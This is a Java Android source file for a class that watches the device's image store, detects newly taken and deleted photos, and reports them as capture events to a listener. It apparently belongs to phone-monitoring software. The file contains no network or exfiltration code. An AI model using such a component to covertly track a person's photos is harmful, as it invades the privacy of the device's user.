package com.vvt.capture.camera.image;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.net.Uri;
import android.provider.MediaStore.Images;

import com.vvt.base.FxEvent;
import com.vvt.calendar.CalendarObserver;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.ioutil.SDCard;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class FxCameraImageCaptureObserver extends IDaemonContentObserver {

	private static final String TAG = "FxCameraImageCaptureObserver";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
		
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	@SuppressWarnings("unused")
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	private HashMap<Long, String> mlatestExternalLocationMap;  
	private HashMap<Long, String> mlatestInternalLocationMap;
	private Timer mTimer = null;
	private static final int SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC = 10; //60000;
	
	private static FxCameraImageCaptureObserver sInstance;
	
	public static FxCameraImageCaptureObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new FxCameraImageCaptureObserver(context);
		}
		return sInstance;
	}
	
	private FxCameraImageCaptureObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		mLoggablePath = DEFAULT_PATH;
		
		mlatestExternalLocationMap = new HashMap<Long, String>();  
		mlatestInternalLocationMap = new HashMap<Long, String>();
	}
	
	public void setLoggablePath(String path) {
		if(LOGV) FxLog.v(TAG, "setLoggablePath # START");
		mLoggablePath = path;
		
		if(LOGV) FxLog.v(TAG, "setLoggablePath # mLoggablePath :" + mLoggablePath);
		if(LOGV) FxLog.v(TAG, "setLoggablePath # EXIT");
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "registerObserver # START");
		
		final String externalDatabaseFilePath = FxCameraImageHelper.getExternalDatabaseFilePath();
		
		if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
			if(LOGD) FxLog.d(TAG, "registerObserver # externalDatabaseFilePath:" + externalDatabaseFilePath);
			
			final HashMap<Long, String> externalImageMap = FxCameraImageHelper.getAllImages(externalDatabaseFilePath);
			if(LOGD) FxLog.d(TAG, String.format("registerObserver # externalImageMap size : %d", externalImageMap.size()));
			setRefExternalImageMap(externalImageMap);
		}
		else {
			if(LOGE) FxLog.e(TAG, "registerObserver # externalDatabaseFilePath is null");
		}
		
		final String internalDatabaseFilePath = FxCameraImageHelper.getInternalDatabaseFilePath();
		
		if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
			if(LOGD) FxLog.d(TAG, "registerObserver # internalDatabaseFilePath:" + internalDatabaseFilePath);

			final HashMap<Long, String> internalImageMap = FxCameraImageHelper.getAllImages(internalDatabaseFilePath);
			if(LOGD) FxLog.d(TAG, String.format("registerObserver # internalImageMap size : %d", internalImageMap.size()));
			setRefInternalImageMap(internalImageMap);
		}
		else {
			if(LOGE) FxLog.e(TAG, "registerObserver # internalDatabaseFilePath is null");
		}
		
		
		mListener = listener;
		super.registerObserver();
		if(LOGV) FxLog.v(TAG, "registerObserver # EXIT");
	}
	
	
	private void setRefExternalImageMap(HashMap<Long, String> map) {
		if(LOGV) FxLog.v(TAG, "setRefExternalImageMap # START");
		if(LOGD) FxLog.d(TAG, "setRefExternalImageMap # map size:" + map.size());
		
		mlatestExternalLocationMap = map;
		FxCameraImageSettings.setRefExternalImageMap(mLoggablePath, map);
		
		if(LOGV) FxLog.v(TAG, "setRefExternalImageMap # EXIT");
	}
	
	private void setRefInternalImageMap(HashMap<Long, String> map) {
		if(LOGV) FxLog.v(TAG, "setRefInternalImageMap # START");
		if(LOGD) FxLog.d(TAG, "setRefInternalImageMap # map size:" + map.size());
		
		mlatestInternalLocationMap = map;
		FxCameraImageSettings.setRefInternalImageMap(mLoggablePath, map);
		
		if(LOGV) FxLog.v(TAG, "setRefInternalImageMap # EXIT");
	}
	
	public void unregisterObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "unregisterObserver # START");
		
		mListener = null;
		super.unregisterObserver();
		
		if(LOGV) FxLog.v(TAG, "unregisterObserver # STOP");
	}
	
	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.v(TAG, "onContentChange # ENTER ...");
		
		if(mTimer != null) {
			mTimer.cancel();
			if(LOGV) FxLog.v(TAG, "count down timer resetting...");
		}	
		
		mTimer = new Timer();
		mTimer.scheduleAtFixedRate(new TimerTask() {
            int i = SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC;
            public void run() {
            	if(LOGV) FxLog.v(TAG, "Comparison will start in:" + i--);
                if (i< 0) {
                	mTimer.cancel();
                	notifyChange();
                }
            }
        }, 0, 1000);
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}
	
	private void notifyChange() {
		if(LOGV) FxLog.v(TAG, "notifyChange # START ...");
		processInternal();
		processExternal();
		if(LOGV) FxLog.v(TAG, "notifyChange # EXIT ...");
	}

	private void processInternal() {
		if(LOGV) FxLog.v(TAG, "processInternal # ENTER ...");
		
		try {
			final String internalDatabaseFilePath = FxCameraImageHelper.getInternalDatabaseFilePath() ;
			
			if(LOGD) FxLog.d(TAG, "processInternal # internalDatabaseFilePath :" + internalDatabaseFilePath);
			
			if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
				final HashMap<Long, String> currentImageMapOfInternal = FxCameraImageHelper.getAllImages(internalDatabaseFilePath);
				ArrayList<FxEvent> events = new ArrayList<FxEvent>();
				
				if(LOGD) FxLog.d(TAG, "processInternal # internalDatabaseFilePath:" + internalDatabaseFilePath);
				if(LOGD) FxLog.d(TAG, "processInternal # currentImageMapOfInternal size:" + currentImageMapOfInternal.size());
				
				if(currentImageMapOfInternal.size() == mlatestInternalLocationMap.size()) {
					// Row count is same. nothing changed. escape ..
					if(LOGV) FxLog.v(TAG, "processInternal # Row count is same. nothing changed. escape ..");
					return;
				}
				else if(currentImageMapOfInternal.size() > mlatestInternalLocationMap.size()) {
					if(LOGD) FxLog.d(TAG, "processInternal #New image has added ..");
					
					// New image has added ..
					events = FxCameraImageHelper.getWhatsNew(mLoggablePath, internalDatabaseFilePath, mlatestInternalLocationMap, currentImageMapOfInternal);
					if(LOGD) FxLog.d(TAG, "processInternal # events size:" + events.size());
					
					// Reset the current map
					setRefInternalImageMap(currentImageMapOfInternal);

					if(events != null && events.size() > 0) {
						if (mListener != null) {
							if(LOGD) FxLog.d(TAG, "processInternal # notify onCapture");
							mListener.onCapture(events);
						}
					}
				}
				else {

					// Check whether SDCars is available. If the SD Card is not available it will return 0 size collection.
					if(!SDCard.isConnected()) {
						if(LOGD) FxLog.d(TAG, "processInternal # SD Card is not connected..");
						return;
					}

					if(LOGD) FxLog.d(TAG, "processInternal # Image has been deleted.");
					// Image has been deleted.
					events = FxCameraImageHelper.getWhatsDeleted(mlatestInternalLocationMap, currentImageMapOfInternal);

					if(LOGD) FxLog.d(TAG, "processInternal # events size:" + events.size());
					
					// Reset the current map
					setRefInternalImageMap(currentImageMapOfInternal);

					if(events != null && events.size() > 0)
						mListener.onCapture(events);
				}
			}
		}
		catch (Throwable t) {
			FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "processInternal # ENTER ...");
	}
	
	private void processExternal() {
		if(LOGV) FxLog.v(TAG, "processExternal # ENTER ...");
		
		ArrayList<FxEvent> events = new ArrayList<FxEvent>();
		
		try {

			final String externalDatabaseFilePath = FxCameraImageHelper.getExternalDatabaseFilePath();
			
			if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
				final HashMap<Long, String> currentImageMapOfExternal = FxCameraImageHelper.getAllImages(externalDatabaseFilePath);
			
				if(LOGD) FxLog.d(TAG, "processExternal # EXTERNAL_DATABASE_FILE_NAME :" + externalDatabaseFilePath);
				if(LOGD) FxLog.d(TAG, String.format("processExternal # currentImageMapOfExternal Size: %d vs  mlatestExternalLocationMap Size: %d", currentImageMapOfExternal.size(), mlatestExternalLocationMap.size()));
				
				if(currentImageMapOfExternal.size() == mlatestExternalLocationMap.size()) {
					// Row count is same. nothing changed. escape ..
					if(LOGD) FxLog.d(TAG, "processExternal # Row count is same. nothing changed. escape ..");
					return;
				}
				else if(currentImageMapOfExternal.size() > mlatestExternalLocationMap.size()) {
					// New image has added ..
					if(LOGD) FxLog.d(TAG, "processExternal # New image has added ..");
					
					events = FxCameraImageHelper.getWhatsNew(mLoggablePath, externalDatabaseFilePath, mlatestExternalLocationMap, currentImageMapOfExternal);
					if(LOGD) FxLog.d(TAG, "processExternal # events size:" + events.size());
					
					// Reset the current map
					setRefExternalImageMap(currentImageMapOfExternal);

					if(events != null && events.size() > 0) {
						if (mListener != null) {
							mListener.onCapture(events);
						}
					}
				}
				else {

					// Check whether SDCars is available. If the SD Card is not available it will return 0 size collection.
					if(!SDCard.isConnected()) {
						if(LOGD) FxLog.d(TAG, "processExternal # SD Card is not conneced, bailing");
						return;
					}

					// Image has been deleted.
					events = FxCameraImageHelper.getWhatsDeleted(mlatestExternalLocationMap, currentImageMapOfExternal);

					// Reset the current map
					setRefExternalImageMap(currentImageMapOfExternal);

					if(events != null && events.size() > 0)
						mListener.onCapture(events);
				}
			}

		}
		catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "processExternal # EXIT ...");
	}
	
	@Override
	protected Uri getContentUri() {
		if(LOGV) FxLog.v(TAG, "getContentUri # ENTER ...");
		Uri mediaUri = Images.Media.EXTERNAL_CONTENT_URI;
		if(LOGV) FxLog.v(TAG, "getContentUri # Uri:" + mediaUri.toString());
		if(LOGV) FxLog.v(TAG, "getContentUri # EXIT ...");
		return mediaUri;
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	public static interface OnCaptureListener {
		public void onCapture(ArrayList<FxEvent> images);
	}
}
